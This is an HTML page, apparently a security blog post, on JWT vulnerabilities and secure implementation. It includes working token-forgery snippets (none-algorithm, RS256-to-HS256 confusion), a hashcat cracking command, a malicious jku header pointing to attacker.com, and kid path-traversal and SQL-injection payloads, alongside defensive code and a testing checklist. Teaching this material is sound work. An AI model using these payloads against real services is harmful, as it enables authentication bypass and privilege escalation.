@@ -1,0 +1,464 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>JWT Security: Common Pitfalls and Best Practices — Francis Kuria</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; line-height: 1.6; color: #e0e0e0; background: linear-gradient(135deg, #0a0e27 0%, #1a1a2e 100%); min-height: 100vh; }
+        .container { max-width: 900px; margin: 0 auto; padding: 20px; }
+        header { background: rgba(26, 26, 46, 0.8); backdrop-filter: blur(10px); padding: 20px 0; margin-bottom: 40px; border-bottom: 2px solid #3a86ff; }
+        nav { display: flex; justify-content: space-between; align-items: center; max-width: 900px; margin: 0 auto; padding: 0 20px; }
+        .logo { font-size: 24px; font-weight: bold; color: #3a86ff; text-decoration: none; }
+        nav ul { display: flex; list-style: none; gap: 30px; }
+        nav a { color: #e0e0e0; text-decoration: none; transition: color 0.3s; }
+        nav a:hover { color: #3a86ff; }
+        .article-meta { color: #888; font-size: 14px; margin-bottom: 20px; display: flex; gap: 20px; flex-wrap: wrap; }
+        .tag { background: rgba(58, 134, 255, 0.2); padding: 5px 15px; border-radius: 20px; color: #3a86ff; font-size: 12px; text-transform: uppercase; }
+        h1 { font-size: 42px; color: #ffffff; margin-bottom: 20px; line-height: 1.2; }
+        h2 { font-size: 32px; color: #ffffff; margin: 40px 0 20px; padding-bottom: 10px; border-bottom: 2px solid #3a86ff; }
+        h3 { font-size: 24px; color: #3a86ff; margin: 30px 0 15px; }
+        p { margin-bottom: 20px; font-size: 17px; color: #d0d0d0; }
+        code { background: rgba(58, 134, 255, 0.1); padding: 2px 8px; border-radius: 4px; font-family: 'Courier New', monospace; color: #3a86ff; }
+        pre { background: #0d1117; padding: 20px; border-radius: 8px; overflow-x: auto; margin: 20px 0; border-left: 4px solid #3a86ff; }
+        pre code { background: none; padding: 0; color: #e0e0e0; font-size: 14px; display: block; line-height: 1.5; }
+        ul, ol { margin: 20px 0 20px 40px; color: #d0d0d0; }
+        li { margin-bottom: 10px; font-size: 17px; }
+        .highlight { background: rgba(58, 134, 255, 0.1); border-left: 4px solid #3a86ff; padding: 20px; margin: 20px 0; border-radius: 4px; }
+        .warning { background: rgba(255, 87, 87, 0.1); border-left: 4px solid #ff5757; padding: 20px; margin: 20px 0; border-radius: 4px; }
+        .back-link { display: inline-block; color: #3a86ff; text-decoration: none; margin-top: 40px; padding: 10px 20px; border: 2px solid #3a86ff; border-radius: 5px; transition: all 0.3s; }
+        .back-link:hover { background: #3a86ff; color: #ffffff; }
+        footer { text-align: center; padding: 40px 20px; color: #888; margin-top: 60px; border-top: 1px solid rgba(58, 134, 255, 0.2); }
+    </style>
+</head>
+<body>
+    <header>
+        <nav>
+            <a href="../index.html" class="logo">🛡️ Francis Kuria</a>
+            <ul>
+                <li><a href="../index.html">Home</a></li>
+                <li><a href="../index.html#work">Projects</a></li>
+                <li><a href="index.html">Blog</a></li>
+                <li><a href="../index.html#contact">Contact</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <div class="container">
+        <article>
+            <div class="article-header">
+                <div class="article-meta">
+                    <span class="tag">📊 Authentication</span>
+                    <span class="tag">Security</span>
+                    <span>📅 Dec 10, 2025</span>
+                    <span>⏱️ 8 min read</span>
+                </div>
+                <h1>JWT Security: Common Pitfalls and Best Practices</h1>
+            </div>
+
+            <p>JSON Web Tokens (JWTs) have become the standard for stateless authentication in modern web applications. Their simplicity and scalability are attractive, but they also introduce unique security challenges. I've seen countless applications with critical JWT vulnerabilities during penetration tests. Let's explore the common pitfalls and learn how to implement JWTs securely.</p>
+
+            <h2>Understanding JWT Structure</h2>
+
+            <p>Before diving into vulnerabilities, let's understand what we're working with. A JWT consists of three parts separated by dots:</p>
+
+            <pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
+
+[Header].[Payload].[Signature]</code></pre>
+
+            <p>Each part is Base64URL encoded JSON:</p>
+
+            <pre><code>// Header
+{
+  "alg": "HS256",
+  "typ": "JWT"
+}
+
+// Payload
+{
+  "sub": "1234567890",
+  "name": "John Doe",
+  "iat": 1516239022,
+  "role": "user"
+}
+
+// Signature
+HMACSHA256(
+  base64UrlEncode(header) + "." + base64UrlEncode(payload),
+  secret
+)</code></pre>
+
+            <h2>Critical Vulnerabilities</h2>
+
+            <h3>1. None Algorithm Attack</h3>
+
+            <p>The JWT specification allows an algorithm of "none" for unsigned tokens. Many libraries accept these tokens even when signatures should be required:</p>
+
+            <pre><code>// Vulnerable token
+{
+  "alg": "none",
+  "typ": "JWT"
+}
+{
+  "sub": "1234567890",
+  "name": "John Doe",
+  "role": "admin"  // Changed from "user"
+}
+
+// No signature needed!
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwicm9sZSI6ImFkbWluIn0.</code></pre>
+
+            <div class="warning">
+                <h4>Testing for None Algorithm:</h4>
+                <pre><code>1. Decode the JWT
+2. Change "alg" to "none"
+3. Modify payload (escalate privileges)
+4. Remove signature (everything after second dot)
+5. Re-encode and test
+
+Python example:
+import base64
+import json
+
+header = {"alg": "none", "typ": "JWT"}
+payload = {"sub": "1234567890", "role": "admin"}
+
+token = (
+    base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=') +
+    '.' +
+    base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=') +
+    '.'
+)</code></pre>
+            </div>
+
+            <h3>2. Algorithm Confusion (RS256 to HS256)</h3>
+
+            <p>Some applications use RSA (RS256) for signing but don't verify the algorithm type. Attackers can switch to HMAC (HS256) and sign with the public key:</p>
+
+            <pre><code>// Attack flow:
+1. Application uses RS256 (asymmetric)
+   - Signs with private key
+   - Verifies with public key
+
+2. Attacker changes alg to HS256 (symmetric)
+   - Server verifies with public key as HMAC secret
+   - Attacker signs with same public key
+
+3. Result: Valid signature!
+
+Python exploit:
+import jwt
+
+# Get public key (often exposed at /.well-known/jwks.json)
+public_key = """-----BEGIN PUBLIC KEY-----
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
+-----END PUBLIC KEY-----"""
+
+# Craft malicious payload
+payload = {
+    "sub": "user@example.com",
+    "role": "admin"
+}
+
+# Sign with public key using HS256
+token = jwt.encode(payload, public_key, algorithm='HS256')</code></pre>
+
+            <h3>3. Weak Secret Keys</h3>
+
+            <p>HMAC-based JWTs are only as secure as their secret key. Weak secrets can be cracked:</p>
+
+            <pre><code>Common weak secrets found in the wild:
+- "secret"
+- "your-256-bit-secret"
+- "changeme"
+- Application name
+- Empty string
+
+Cracking with hashcat:
+hashcat -a 0 -m 16500 jwt.txt rockyou.txt
+
+Custom wordlist generation:
+# Common patterns
+company_name + year
+company_name + "secret"
+company_name + "jwt"</code></pre>
+
+            <h3>4. Missing Expiration Validation</h3>
+
+            <p>JWTs without expiration times or improper validation create permanent access tokens:</p>
+
+            <pre><code>// Vulnerable: No expiration
+{
+  "sub": "user123",
+  "role": "user"
+  // Missing: "exp" claim
+}
+
+// Vulnerable: No validation
+// Server doesn't check if exp < current_time
+
+// Proper implementation:
+{
+  "sub": "user123",
+  "role": "user",
+  "iat": 1640000000,  // Issued at
+  "exp": 1640003600   // Expires in 1 hour
+}
+
+// Server-side validation
+import time
+
+def verify_token(token):
+    try:
+        payload = jwt.decode(token, secret, algorithms=['HS256'])
+        
+        # Check expiration
+        if 'exp' not in payload:
+            return False
+        
+        if payload['exp'] < time.time():
+            return False
+        
+        return payload
+    except jwt.ExpiredSignatureError:
+        return False</code></pre>
+
+            <h3>5. JKU/X5U Header Injection</h3>
+
+            <p>Headers like <code>jku</code> (JSON Web Key Set URL) and <code>x5u</code> (X.509 URL) tell the server where to fetch verification keys. Attackers can point these to their own servers:</p>
+
+            <pre><code>// Malicious header
+{
+  "alg": "RS256",
+  "typ": "JWT",
+  "jku": "https://attacker.com/jwks.json"
+}
+
+// Attacker's server returns their public key:
+{
+  "keys": [{
+    "kty": "RSA",
+    "kid": "attacker-key",
+    "use": "sig",
+    "n": "...",  // Attacker's public key
+    "e": "AQAB"
+  }]
+}
+
+// Attacker signs with their private key
+// Server fetches key from attacker's jku URL
+// Server validates with attacker's public key
+// Attack succeeds!</code></pre>
+
+            <h3>6. Kid Header Injection</h3>
+
+            <p>The <code>kid</code> (Key ID) header specifies which key to use for verification. Poor validation allows path traversal or SQL injection:</p>
+
+            <pre><code>// Path traversal attack
+{
+  "alg": "HS256",
+  "typ": "JWT",
+  "kid": "../../../../dev/null"
+}
+// Server uses empty file as secret (null byte)
+
+// SQL injection
+{
+  "alg": "HS256",
+  "typ": "JWT",
+  "kid": "key1' UNION SELECT 'secret'--"
+}
+// Server queries: SELECT key FROM keys WHERE id = 'key1' UNION SELECT 'secret'--'
+// Attacker knows the secret is 'secret'</code></pre>
+
+            <h2>Secure Implementation Best Practices</h2>
+
+            <h3>1. Enforce Algorithm Whitelist</h3>
+
+            <pre><code>// Bad: Accepts any algorithm
+jwt.decode(token, secret)
+
+// Good: Explicitly specify allowed algorithms
+jwt.decode(token, secret, algorithms=['HS256'])
+
+// Better: Validate in middleware
+const allowedAlgorithms = ['RS256'];
+
+function verifyToken(token) {
+    const decoded = jwt.decode(token, {complete: true});
+    
+    if (!allowedAlgorithms.includes(decoded.header.alg)) {
+        throw new Error('Invalid algorithm');
+    }
+    
+    return jwt.verify(token, getPublicKey(), {
+        algorithms: allowedAlgorithms
+    });
+}</code></pre>
+
+            <h3>2. Use Strong Secrets</h3>
+
+            <pre><code>// Generate cryptographically secure secret
+import secrets
+
+# Minimum 256 bits (32 bytes) for HS256
+jwt_secret = secrets.token_urlsafe(32)
+
+# Minimum 2048 bits for RS256
+openssl genrsa -out private.pem 2048
+openssl rsa -in private.pem -pubout -out public.pem</code></pre>
+
+            <h3>3. Implement Proper Claims</h3>
+
+            <div class="highlight">
+                <h4>Essential JWT Claims:</h4>
+                <ul>
+                    <li><code>iss</code> (Issuer): Verify token source</li>
+                    <li><code>sub</code> (Subject): User identifier</li>
+                    <li><code>aud</code> (Audience): Intended recipient</li>
+                    <li><code>exp</code> (Expiration): Token lifetime</li>
+                    <li><code>nbf</code> (Not Before): Token validity start</li>
+                    <li><code>iat</code> (Issued At): Token creation time</li>
+                    <li><code>jti</code> (JWT ID): Unique token identifier (for revocation)</li>
+                </ul>
+            </div>
+
+            <pre><code>// Comprehensive token generation
+import time
+import uuid
+
+def create_token(user_id, role):
+    payload = {
+        'iss': 'https://api.example.com',
+        'sub': user_id,
+        'aud': 'https://app.example.com',
+        'exp': int(time.time()) + 3600,  # 1 hour
+        'nbf': int(time.time()),
+        'iat': int(time.time()),
+        'jti': str(uuid.uuid4()),
+        'role': role
+    }
+    
+    return jwt.encode(payload, secret, algorithm='HS256')
+
+// Comprehensive validation
+def verify_token(token):
+    try:
+        payload = jwt.decode(
+            token,
+            secret,
+            algorithms=['HS256'],
+            audience='https://app.example.com',
+            issuer='https://api.example.com'
+        )
+        
+        # Additional checks
+        if not is_token_revoked(payload['jti']):
+            return payload
+        
+    except jwt.InvalidTokenError:
+        return None</code></pre>
+
+            <h3>4. Implement Token Revocation</h3>
+
+            <p>JWTs are stateless, making revocation challenging. Implement a revocation strategy:</p>
+
+            <pre><code>// Option 1: Blacklist (store revoked token IDs)
+revoked_tokens = set()
+
+def revoke_token(jti):
+    revoked_tokens.add(jti)
+    # Persist to Redis with TTL = token expiration
+
+def is_token_revoked(jti):
+    return jti in revoked_tokens
+
+// Option 2: Short-lived access tokens + refresh tokens
+access_token_lifetime = 15 * 60  # 15 minutes
+refresh_token_lifetime = 7 * 24 * 60 * 60  # 7 days
+
+// Option 3: Version claims
+{
+  "sub": "user123",
+  "token_version": 2,  // Increment on password change
+  "exp": 1640003600
+}
+
+// Server validates token_version against database</code></pre>
+
+            <h3>5. Secure Storage</h3>
+
+            <pre><code>// Client-side storage options:
+
+// Bad: localStorage (XSS vulnerable)
+localStorage.setItem('token', jwt);
+
+// Better: httpOnly cookie (XSS protected, CSRF vulnerable)
+res.cookie('token', jwt, {
+    httpOnly: true,
+    secure: true,      // HTTPS only
+    sameSite: 'strict' // CSRF protection
+});
+
+// Best: httpOnly cookie + CSRF token
+res.cookie('token', jwt, {
+    httpOnly: true,
+    secure: true,
+    sameSite: 'lax'
+});
+// Plus separate CSRF token in header</code></pre>
+
+            <h3>6. Avoid Sensitive Data in Payload</h3>
+
+            <div class="warning">
+                <h4>⚠️ Never Store in JWT Payload:</h4>
+                <ul>
+                    <li>Passwords or password hashes</li>
+                    <li>Credit card numbers</li>
+                    <li>Social Security numbers</li>
+                    <li>API keys or secrets</li>
+                    <li>Sensitive personal information</li>
+                </ul>
+                <p>JWT payloads are Base64 encoded, not encrypted. Anyone with the token can decode and read the payload.</p>
+            </div>
+
+            <h2>Testing Your JWT Implementation</h2>
+
+            <h3>Security Checklist</h3>
+
+            <pre><code>Manual testing:
+□ Try "alg": "none"
+□ Try algorithm confusion (RS256 → HS256)
+□ Test with expired tokens
+□ Test with future nbf times
+□ Modify payload (role, user_id)
+□ Test missing signature
+□ Test jku/x5u header injection
+□ Test kid header injection
+□ Brute force weak secrets
+□ Check for sensitive data in payload
+
+Automated testing:
+# jwt_tool
+python3 jwt_tool.py <JWT> -M at
+
+# Burp Suite JWT extensions
+# Add JWT Editor extension
+# Analyze tokens automatically</code></pre>
+
+            <h2>Conclusion</h2>
+
+            <p>JWTs are powerful but require careful implementation. The most common mistakes stem from trusting client-controlled data (like the algorithm header) and weak secrets. By following these best practices and understanding common attack vectors, you can implement JWT authentication securely.</p>
+
+            <p>Remember: Security is not just about following a checklist. Understand the threats, implement defense in depth, and regularly test your implementation. JWTs are just one piece of your authentication system—ensure all components work together securely.</p>
+
+            <a href="index.html" class="back-link">← Back to Blog</a>
+        </article>
+    </div>
+
+    <footer>
+        <p>© 2026 Francis Kuria • Sharing security knowledge, one post at a time</p>
+    </footer>
+</body>
+</html>
